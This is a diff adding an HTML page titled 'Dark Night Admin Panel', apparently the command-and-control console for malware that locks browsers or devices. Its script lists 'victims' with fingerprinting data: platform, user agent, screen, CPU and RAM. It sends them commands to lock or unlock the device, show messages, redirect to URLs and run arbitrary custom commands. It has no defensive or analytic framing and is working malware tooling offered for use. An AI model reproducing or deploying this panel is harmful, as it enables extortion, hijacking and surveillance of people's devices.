@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dark Night Admin Panel</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }
+        
+        .header {
+            background: #000;
+            padding: 20px;
+            border-bottom: 2px solid #00ff00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 20px;
+        }
+        
+        .stat-box {
+            background: #1a1a1a;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 28px;
+            font-weight: bold;
+            color: #ff4444;
+        }
+        
+        .container {
+            display: flex;
+            height: calc(100vh - 80px);
+        }
+        
+        .sidebar {
+            width: 300px;
+            background: #111;
+            border-right: 1px solid #333;
+            overflow-y: auto;
+        }
+        
+        .victim-item {
+            padding: 15px;
+            border-bottom: 1px solid #222;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        
+        .victim-item:hover {
+            background: #1a1a1a;
+        }
+        
+        .victim-item.active {
+            background: #1a3a1a;
+            border-left: 3px solid #00ff00;
+        }
+        
+        .victim-id {
+            font-size: 12px;
+            color: #888;
+        }
+        
+        .victim-status {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        
+        .status-online { background: #00ff00; box-shadow: 0 0 5px #00ff00; }
+        .status-offline { background: #ff4444; }
+        .status-looped { background: #ffaa00; }
+        
+        .main-panel {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+        }
+        
+        .info-card {
+            background: #111;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        
+        .info-row {
+            display: flex;
+            margin: 10px 0;
+            padding: 5px;
+            border-bottom: 1px solid #222;
+        }
+        
+        .info-label {
+            width: 150px;
+            font-weight: bold;
+            color: #888;
+        }
+        
+        .info-value {
+            flex: 1;
+            color: #00ff00;
+            word-break: break-all;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            background: #1a1a1a;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 14px;
+            transition: 0.3s;
+        }
+        
+        button:hover {
+            background: #00ff00;
+            color: #000;
+        }
+        
+        .btn-danger {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        
+        .btn-danger:hover {
+            background: #ff4444;
+            color: #000;
+        }
+        
+        .btn-success {
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+        
+        .btn-warning {
+            border-color: #ffaa00;
+            color: #ffaa00;
+        }
+        
+        input, textarea {
+            width: 100%;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            color: #00ff00;
+            padding: 10px;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+        
+        .log-area {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            height: 200px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 12px;
+        }
+        
+        .log-entry {
+            color: #888;
+            border-bottom: 1px solid #1a1a1a;
+            padding: 5px;
+        }
+        
+        .log-entry.info { color: #00ff00; }
+        .log-entry.warning { color: #ffaa00; }
+        .log-entry.error { color: #ff4444; }
+        
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="title">🌑 DARK NIGHT ADMIN PANEL v5.0</div>
+        <div class="stats">
+            <div class="stat-box">
+                <div>Total Victims</div>
+                <div class="stat-number" id="totalVictims">0</div>
+            </div>
+            <div class="stat-box">
+                <div>Online</div>
+                <div class="stat-number" id="onlineVictims">0</div>
+            </div>
+            <div class="stat-box">
+                <div>Looped Active</div>
+                <div class="stat-number" id="loopedVictims">0</div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="sidebar" id="sidebar">
+            <div style="padding: 10px; text-align: center; color: #888;">No victims connected</div>
+        </div>
+        
+        <div class="main-panel" id="mainPanel">
+            <div class="info-card" style="text-align: center; color: #888;">
+                Select a victim from the sidebar to control
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let victims = new Map();
+        let selectedVictim = null;
+        let refreshInterval = null;
+        
+        const ADMIN_SERVER_URL = window.location.origin;
+        
+        // ========== FETCH ALL VICTIMS ==========
+        async function fetchVictims() {
+            try {
+                const res = await fetch('/api/victims');
+                const data = await res.json();
+                victims = new Map(Object.entries(data));
+                updateSidebar();
+                updateStats();
+            } catch(e) {
+                console.error('Fetch victims error:', e);
+            }
+        }
+        
+        // ========== UPDATE SIDEBAR ==========
+        function updateSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            
+            if(victims.size === 0) {
+                sidebar.innerHTML = '<div style="padding: 10px; text-align: center; color: #888;">No victims connected</div>';
+                return;
+            }
+            
+            let html = '';
+            for(let [id, victim] of victims) {
+                const lastSeen = Date.now() - (victim.last_seen || 0);
+                const isOnline = lastSeen < 10000;
+                const isLooped = victim.is_looped !== false;
+                
+                let statusClass = 'status-offline';
+                let statusText = 'OFFLINE';
+                if(isOnline) {
+                    statusClass = isLooped ? 'status-looped' : 'status-online';
+                    statusText = isLooped ? 'LOOPED' : 'UNLOCKED';
+                }
+                
+                html += `
+                    <div class="victim-item ${selectedVictim === id ? 'active' : ''}" onclick="selectVictim('${id}')">
+                        <div>
+                            <span class="victim-status ${statusClass}"></span>
+                            <strong>${victim.victim_id.substring(0, 20)}...</strong>
+                        </div>
+                        <div class="victim-id">${statusText} | ${new Date(victim.last_seen).toLocaleTimeString()}</div>
+                        <div class="victim-id">${victim.cores || '?'} cores | ${victim.platform || '?'}</div>
+                    </div>
+                `;
+            }
+            sidebar.innerHTML = html;
+        }
+        
+        // ========== UPDATE STATS ==========
+        function updateStats() {
+            const total = victims.size;
+            let online = 0;
+            let looped = 0;
+            
+            for(let victim of victims.values()) {
+                const isOnline = (Date.now() - (victim.last_seen || 0)) < 10000;
+                if(isOnline) online++;
+                if(victim.is_looped !== false) looped++;
+            }
+            
+            document.getElementById('totalVictims').innerText = total;
+            document.getElementById('onlineVictims').innerText = online;
+            document.getElementById('loopedVictims').innerText = looped;
+        }
+        
+        // ========== SELECT VICTIM ==========
+        async function selectVictim(id) {
+            selectedVictim = id;
+            updateSidebar();
+            
+            const victim = victims.get(id);
+            if(!victim) return;
+            
+            const mainPanel = document.getElementById('mainPanel');
+            
+            mainPanel.innerHTML = `
+                <div class="info-card">
+                    <h3>🎯 VICTIM DETAILS</h3>
+                    <div class="info-row">
+                        <div class="info-label">Victim ID:</div>
+                        <div class="info-value">${victim.victim_id}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Status:</div>
+                        <div class="info-value">${victim.is_looped !== false ? '🔴 LOOP ACTIVE' : '🟢 UNLOCKED'}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Last Seen:</div>
+                        <div class="info-value">${new Date(victim.last_seen).toLocaleString()}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Platform:</div>
+                        <div class="info-value">${victim.platform || 'Unknown'}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">User Agent:</div>
+                        <div class="info-value" style="font-size: 11px;">${victim.user_agent || 'Unknown'}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Screen:</div>
+                        <div class="info-value">${victim.screen || 'Unknown'}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">CPU Cores:</div>
+                        <div class="info-value">${victim.cores || 'Unknown'}</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">RAM:</div>
+                        <div class="info-value">${victim.memory || 'Unknown'} GB</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">First Seen:</div>
+                        <div class="info-value">${new Date(victim.first_seen).toLocaleString()}</div>
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <h3>🎮 CONTROL PANEL</h3>
+                    <div class="button-group">
+                        <button class="btn-danger" onclick="stopLoop('${id}')">🛑 STOP LOOP (Unlock Device)</button>
+                        <button class="btn-success" onclick="resumeLoop('${id}')">⚠️ RESUME LOOP (Lock Again)</button>
+                        <button class="btn-warning" onclick="showMessage('${id}')">💬 SEND MESSAGE</button>
+                        <button class="btn-warning" onclick="redirectVictim('${id}')">🔗 REDIRECT TO URL</button>
+                        <button class="btn-danger" onclick="removeVictim('${id}')">🗑️ REMOVE FROM LIST</button>
+                    </div>
+                </div>
+                
+                <div class="info-card">
+                    <h3>📡 QUICK COMMAND</h3>
+                    <input type="text" id="quickCommand" placeholder="Enter custom command...">
+                    <button onclick="sendQuickCommand('${id}')">EXECUTE</button>
+                </div>
+                
+                <div class="info-card">
+                    <h3>📋 ACTIVITY LOG</h3>
+                    <div class="log-area" id="logArea">
+                        <div class="log-entry info">[${new Date().toLocaleTimeString()}] Victim selected</div>
+                    </div>
+                </div>
+            `;
+            
+            addLog('Victim selected for control');
+        }
+        
+        // ========== STOP LOOP ==========
+        async function stopLoop(id) {
+            try {
+                await fetch(`/api/command/${id}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'stop_loop' })
+                });
+                addLog(`🛑 STOP LOOP command sent to ${id.substring(0, 20)}...`, 'success');
+                alert('Stop loop command sent! The victim\'s device will unlock shortly.');
+            } catch(e) {
+                addLog(`Error sending stop loop: ${e}`, 'error');
+            }
+        }
+        
+        // ========== RESUME LOOP ==========
+        async function resumeLoop(id) {
+            if(confirm('⚠️ WARNING: This will re-lock the victim\'s device. Are you sure?')) {
+                try {
+                    await fetch(`/api/command/${id}`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ action: 'resume_loop' })
+                    });
+                    addLog(`⚠️ RESUME LOOP command sent to ${id.substring(0, 20)}...`, 'warning');
+                    alert('Resume loop command sent! The victim will be locked again.');
+                } catch(e) {
+                    addLog(`Error sending resume loop: ${e}`, 'error');
+                }
+            }
+        }
+        
+        // ========== SHOW MESSAGE ==========
+        function showMessage(id) {
+            const msg = prompt('Enter message to show to victim:');
+            if(msg) {
+                fetch(`/api/command/${id}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'show_message', message: msg })
+                });
+                addLog(`💬 Message sent to ${id.substring(0, 20)}...: "${msg}"`, 'info');
+            }
+        }
+        
+        // ========== REDIRECT VICTIM ==========
+        function redirectVictim(id) {
+            const url = prompt('Enter URL to redirect victim to:');
+            if(url) {
+                fetch(`/api/command/${id}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'redirect', url: url })
+                });
+                addLog(`🔗 Redirect command sent to ${id.substring(0, 20)}... -> ${url}`, 'info');
+            }
+        }
+        
+        // ========== REMOVE VICTIM ==========
+        async function removeVictim(id) {
+            if(confirm('Remove this victim from the list?')) {
+                await fetch(`/api/victim/${id}`, { method: 'DELETE' });
+                addLog(`🗑️ Victim ${id.substring(0, 20)}... removed from list`, 'warning');
+                if(selectedVictim === id) {
+                    selectedVictim = null;
+                    document.getElementById('mainPanel').innerHTML = '<div class="info-card" style="text-align: center; color: #888;">Select a victim from the sidebar to control</div>';
+                }
+                await fetchVictims();
+            }
+        }
+        
+        // ========== SEND QUICK COMMAND ==========
+        async function sendQuickCommand(id) {
+            const cmd = document.getElementById('quickCommand')?.value;
+            if(cmd) {
+                await fetch(`/api/command/${id}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'custom', command: cmd })
+                });
+                addLog(`📟 Custom command sent: ${cmd}`, 'info');
+                document.getElementById('quickCommand').value = '';
+            }
+        }
+        
+        // ========== ADD LOG ==========
+        function addLog(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
+            if(logArea) {
+                const time = new Date().toLocaleTimeString();
+                logArea.innerHTML += `<div class="log-entry ${type}">[${time}] ${message}</div>`;
+                logArea.scrollTop = logArea.scrollHeight;
+            }
+        }
+        
+        // ========== AUTO REFRESH ==========
+        setInterval(fetchVictims, 3000);
+        fetchVictims();
+    </script>
+</body>
+</html>
